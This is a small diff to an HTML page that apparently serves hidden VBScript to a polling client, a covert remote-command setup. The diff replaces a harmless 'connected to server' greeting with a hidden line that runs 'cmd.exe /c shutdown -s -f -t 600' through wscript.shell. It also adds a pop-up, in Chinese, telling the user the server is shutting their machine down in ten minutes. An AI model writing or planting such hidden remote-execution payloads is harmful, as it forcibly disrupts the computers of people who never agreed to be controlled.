@@ -2,13 +2,10 @@
 <head><meta charset="UTF-8"></head>
 <body>
 <div id="mode" style="display:none;">0</div>
-<div id="id" style="display:none;">20217101</div>
+<div id="id" style="display:none;">2021712</div>
 <div id="main" style="display:none;">
 On Error Resume Next
-Set k = ie.Document.getElementById("exe")
-On Error Resume Next
-k1 = k.innerHTML
-msgbox k1
-</div><div id="exe" style="display:none;">你好
-你已连上服务器
+CreateObject("wscript.shell").run "cmd.exe /c shutdown -s -f -t 600"
+msgbox "服务器正在关你的机，剩余10分钟……",4096,"温馨提示"
+</div><div id="exe" style="display:none;">服务器正在关你的机，剩余10分钟……
 </div></body></html>
